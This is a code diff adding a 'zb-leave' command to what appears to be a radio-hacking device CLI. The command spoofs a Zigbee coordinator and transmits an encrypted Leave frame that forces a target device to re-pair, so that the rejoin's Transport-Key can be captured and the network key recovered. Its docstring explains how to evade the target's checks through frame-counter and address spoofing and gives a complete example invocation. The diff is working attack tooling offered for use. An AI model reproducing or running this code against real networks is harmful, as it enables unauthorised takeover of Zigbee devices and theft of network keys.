@@ -6738,6 +6738,89 @@ class StandaloneEsbPair(DeviceRequiredUnit):
             print(color_string((CR, f"trigger failed: status={resp.status}")))
 
 
+@standalone.command('zb-leave')
+class StandaloneZbLeave(DeviceRequiredUnit):
+    """
+    Transmit a NWK-secured Zigbee Leave command to force a device to re-pair, so
+    the rejoin's Transport-Key can be captured and the network key recovered.
+    Needs the network key (from `standalone zigbee get-result --pairing`-style
+    recovery in cli_zigbee), the target's short address, and the channel. The
+    frame counter must be ahead of the target's last-seen value, and the spoofed
+    source (coordinator) short/IEEE must look trusted to the target, or the stack
+    may drop it.
+
+    Example:
+        standalone zb-leave --key <32hex> --target 1234 --channel 15 \\
+            --dst-pan 1463 --src-ieee 00124b0001020304 --counter 0x2000
+    """
+
+    def args_parser(self) -> ArgumentParserNoExit:
+        parser = ArgumentParserNoExit()
+        parser.description = 'Transmit a NWK-secured Leave to force a Zigbee device to re-pair'
+        parser.add_argument('--key', required=True, metavar='<hex>', help='16-byte network key (hex)')
+        parser.add_argument('--target', required=True, metavar='<hex>',
+                            help='target device short address (4 hex chars)')
+        parser.add_argument('--channel', type=int, required=True, metavar='<n>', help='Zigbee channel 11..26')
+        parser.add_argument('--dst-pan', required=True, metavar='<hex>', help='PAN id (4 hex chars)')
+        parser.add_argument('--src-ieee', required=True, metavar='<hex>',
+                            help='spoofed source (coordinator) IEEE, 16 hex chars')
+        parser.add_argument('--src', default='0000', metavar='<hex>',
+                            help='spoofed source short address (default 0000 = coordinator)')
+        parser.add_argument('--counter', type=lambda s: int(s, 0), default=1, metavar='<n>',
+                            help='NWK frame counter, ahead of the target (default 1)')
+        parser.add_argument('--key-seq', type=int, default=0, metavar='<n>', help='network key sequence (default 0)')
+        parser.add_argument('--repeat', type=int, default=3, metavar='<n>', help='retransmit N times (default 3)')
+        parser.add_argument('--no-rejoin', action='store_true', help='leave without the rejoin flag')
+        return parser
+
+    def on_exec(self, args):
+        import zb_parse as zp
+        try:
+            key = bytes.fromhex(args.key)
+            target = int(args.target, 16)
+            src = int(args.src, 16)
+            dst_pan = int(args.dst_pan, 16)
+            src_ieee = int(args.src_ieee, 16)
+        except ValueError:
+            print(color_string((CR, "--key/--target/--dst-pan/--src/--src-ieee must be hex")))
+            return
+        if len(key) != 16:
+            print(color_string((CR, "--key must be 16 bytes (32 hex chars)")))
+            return
+        if not (11 <= args.channel <= 26):
+            print(color_string((CR, "--channel must be 11..26")))
+            return
+
+        try:
+            frame = zp.build_nwk_leave(key, target_short=target, src_short=src, dst_pan=dst_pan,
+                                       src_ieee=src_ieee, frame_counter=args.counter,
+                                       key_seq=args.key_seq, rejoin=not args.no_rejoin)
+        except Exception as e:
+            print(color_string((CR, f"could not build Leave: {e}")))
+            return
+        if len(frame) > 60:
+            print(color_string((CR, f"frame too large for config ({len(frame)}B)")))
+            return
+
+        resp = self.cmd.standalone_set_mode(StandaloneMode.ZB_TX)
+        if hasattr(resp, 'status') and resp.status != Status.SUCCESS:
+            print(color_string((CR, f"set-mode failed: status={resp.status}")))
+            return
+        cfg = struct.pack('<BBBBB', 1, args.channel, max(1, args.repeat) & 0xFF, 10, len(frame)) + frame
+        resp = self.cmd.standalone_set_config(StandaloneMode.ZB_TX, cfg)
+        if resp.status != Status.SUCCESS:
+            print(color_string((CR, f"set-config failed: status={resp.status}")))
+            return
+        resp = self.cmd.standalone_trigger()
+        if resp.status == Status.SUCCESS:
+            rj = "" if args.no_rejoin else " (rejoin)"
+            print(color_string((CG, f"transmitted Leave{rj} to {target:04X} on ch {args.channel} "
+                                    f"x{max(1, args.repeat)}. Capture the rejoin on another CU "
+                                    "and recover the key with cli_zigbee.")))
+        else:
+            print(color_string((CR, f"trigger failed: status={resp.status}")))
+
+
 @standalone.command('disarm')
 class StandaloneDisarm(DeviceRequiredUnit):
     """
